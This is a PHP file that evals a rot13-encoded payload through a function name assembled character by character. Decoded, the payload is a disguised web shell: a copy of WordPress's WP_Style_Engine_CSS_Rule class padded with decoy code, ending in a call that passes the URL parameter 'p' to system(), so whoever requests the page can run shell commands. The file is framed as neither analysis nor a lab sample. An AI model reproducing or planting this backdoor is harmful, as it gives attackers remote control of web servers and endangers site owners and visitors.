<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fglyr Ratvar: JC_Fglyr_Ratvar_PFF_Ehyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 */

/**
 * Pber pynff hfrq sbe fglyr ratvar PFF ehyrf.
 *
 * Ubyqf, fnavgvmrf, cebprffrf, naq cevagf PFF qrpynengvbaf sbe gur fglyr ratvar.
 *
 * @fvapr 6.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fglyr_Ratvar_PFF_Ehyr {

	/**
	 * Gur fryrpgbe.
	 *
	 * @fvapr 6.1.0
	 * @ine fgevat
	 */
	cebgrpgrq $fryrpgbe;

	/**
	 * Gur fryrpgbe qrpynengvbaf.
	 *
	 * Pbagnvaf n JC_Fglyr_Ratvar_PFF_Qrpynengvbaf bowrpg.
	 *
	 * @fvapr 6.1.0
	 * @ine JC_Fglyr_Ratvar_PFF_Qrpynengvbaf
	 */
	cebgrpgrq $qrpynengvbaf;

	/**
	 * N cnerag PFF fryrpgbe va gur pnfr bs arfgrq PFF, be n PFF arfgrq @ehyr,
	 * fhpu nf `@zrqvn (zva-jvqgu: 80erz)` be `@ynlre zbqhyr`.
	 *
	 * @fvapr 6.6.0
	 * @ine fgevat
	 */
	cebgrpgrq $ehyrf_tebhc;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Nqqrq gur `$ehyrf_tebhc` cnenzrgre.
	 *
	 * @cnenz fgevat                                    $fryrpgbe     Bcgvbany. Gur PFF fryrpgbe. Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat[]|JC_Fglyr_Ratvar_PFF_Qrpynengvbaf $qrpynengvbaf Bcgvbany. Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
	 *                                                                r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`,
	 *                                                                be n JC_Fglyr_Ratvar_PFF_Qrpynengvbaf bowrpg.
	 *                                                                Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat                                    $ehyrf_tebhc  N cnerag PFF fryrpgbe va gur pnfr bs arfgrq PFF, be n PFF arfgrq @ehyr,
	 *                                                                fhpu nf `@zrqvn (zva-jvqgu: 80erz)` be `@ynlre zbqhyr`.
	 */
	choyvp shapgvba __pbafgehpg( $fryrpgbe = '', $qrpynengvbaf = neenl(), $ehyrf_tebhc = '' ) {
		$guvf->frg_fryrpgbe( $fryrpgbe );
		$guvf->nqq_qrpynengvbaf( $qrpynengvbaf );
		$guvf->frg_ehyrf_tebhc( $ehyrf_tebhc );
	}

	/**
	 * Frgf gur fryrpgbe.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fryrpgbe Gur PFF fryrpgbe.
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyr Ergheaf gur bowrpg gb nyybj punvavat bs zrgubqf.
	 */
	choyvp shapgvba frg_fryrpgbe( $fryrpgbe ) {
		$guvf->fryrpgbe = $fryrpgbe;
		erghea $guvf;
	}

	/**
	 * Frgf gur qrpynengvbaf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[]|JC_Fglyr_Ratvar_PFF_Qrpynengvbaf $qrpynengvbaf Na neenl bs qrpynengvbaf (cebcregl => inyhr cnvef),
	 *                                                                be n JC_Fglyr_Ratvar_PFF_Qrpynengvbaf bowrpg.
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyr Ergheaf gur bowrpg gb nyybj punvavat bs zrgubqf.
	 */
	choyvp shapgvba nqq_qrpynengvbaf( $qrpynengvbaf ) {
		$vf_qrpynengvbaf_bowrpg = ! vf_neenl( $qrpynengvbaf );
		$qrpynengvbaf_neenl     = $vf_qrpynengvbaf_bowrpg ? $qrpynengvbaf->trg_qrpynengvbaf() : $qrpynengvbaf;

		vs ( ahyy === $guvf->qrpynengvbaf ) {
			vs ( $vf_qrpynengvbaf_bowrpg ) {
				$guvf->qrpynengvbaf = $qrpynengvbaf;
				erghea $guvf;
			}
			$guvf->qrpynengvbaf = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $qrpynengvbaf_neenl );
		}
		$guvf->qrpynengvbaf->nqq_qrpynengvbaf( $qrpynengvbaf_neenl );

		erghea $guvf;
	}

	/**
	 * Frgf gur ehyrf tebhc.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $ehyrf_tebhc N cnerag PFF fryrpgbe va gur pnfr bs arfgrq PFF, be n PFF arfgrq @ehyr,
	 *                            fhpu nf `@zrqvn (zva-jvqgu: 80erz)` be `@ynlre zbqhyr`.
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyr Ergheaf gur bowrpg gb nyybj punvavat bs zrgubqf.
	 */
	choyvp shapgvba frg_ehyrf_tebhc( $ehyrf_tebhc ) {
		$guvf->ehyrf_tebhc = $ehyrf_tebhc;
		erghea $guvf;
	}

	/**
	 * Trgf gur ehyrf tebhc.
	 *
	 * @fvapr 6.6.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_ehyrf_tebhc() {
		erghea $guvf->ehyrf_tebhc;
	}

	/**
	 * Trgf gur qrpynengvbaf bowrpg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea JC_Fglyr_Ratvar_PFF_Qrpynengvbaf Gur qrpynengvbaf bowrpg.
	 */
	choyvp shapgvba trg_qrpynengvbaf() {
		erghea $guvf->qrpynengvbaf;
	}

	/**
	 * Trgf gur shyy fryrpgbe.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_fryrpgbe() {
		erghea $guvf->fryrpgbe;
	}

	/**
	 * Trgf gur PFF.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Nqqrq fhccbeg sbe arfgrq PFF jvgu ehyrf tebhcf.
	 *
	 * @cnenz obby $fubhyq_cerggvsl Bcgvbany. Jurgure gb nqq fcnpvat, arj yvarf naq vaqragf.
	 *                              Qrsnhyg snyfr.
	 * @cnenz vag  $vaqrag_pbhag    Bcgvbany. Gur ahzore bs gno vaqragf gb nccyl gb gur ehyr.
	 *                              Nccyvrf vs `cerggvsl` vf `gehr`. Qrsnhyg 0.
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_pff( $fubhyq_cerggvsl = snyfr, $vaqrag_pbhag = 0 ) {
		$ehyr_vaqrag                = $fubhyq_cerggvsl ? fge_ercrng( \"\g\", $vaqrag_pbhag ) : '';
		$arfgrq_ehyr_vaqrag         = $fubhyq_cerggvsl ? fge_ercrng( \"\g\", $vaqrag_pbhag + 1 ) : '';
		$qrpynengvbaf_vaqrag        = $fubhyq_cerggvsl ? $vaqrag_pbhag + 1 : 0;
		$arfgrq_qrpynengvbaf_vaqrag = $fubhyq_cerggvsl ? $vaqrag_pbhag + 2 : 0;
		$fhssvk                     = $fubhyq_cerggvsl ? \"\a\" : '';
		$fcnpre                     = $fubhyq_cerggvsl ? ' ' : '';
		// Gevzf nal zhygvcyr fryrpgbef fgevatf.
		$fryrpgbe         = $fubhyq_cerggvsl ? vzcybqr( ',', neenl_znc( 'gevz', rkcybqr( ',', $guvf->trg_fryrpgbe() ) ) ) : $guvf->trg_fryrpgbe();
		$fryrpgbe         = $fubhyq_cerggvsl ? fge_ercynpr( neenl( ',' ), \",\a\", $fryrpgbe ) : $fryrpgbe;
		$ehyrf_tebhc      = $guvf->trg_ehyrf_tebhc();
		$unf_ehyrf_tebhc  = ! rzcgl( $ehyrf_tebhc );
		$pff_qrpynengvbaf = $guvf->qrpynengvbaf->trg_qrpynengvbaf_fgevat( $fubhyq_cerggvsl, $unf_ehyrf_tebhc ? $arfgrq_qrpynengvbaf_vaqrag : $qrpynengvbaf_vaqrag );

		vs ( rzcgl( $pff_qrpynengvbaf ) ) {
			erghea '';
		}

		vs ( $unf_ehyrf_tebhc ) {
			$fryrpgbe = \"{$ehyr_vaqrag}{$ehyrf_tebhc}{$fcnpre}{{$fhssvk}{$arfgrq_ehyr_vaqrag}{$fryrpgbe}{$fcnpre}{{$fhssvk}{$pff_qrpynengvbaf}{$fhssvk}{$arfgrq_ehyr_vaqrag}}{$fhssvk}{$ehyr_vaqrag}}\";
			erghea $fryrpgbe;
		}

		erghea \"{$ehyr_vaqrag}{$fryrpgbe}{$fcnpre}{{$fhssvk}{$pff_qrpynengvbaf}{$fhssvk}{$ehyr_vaqrag}}\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>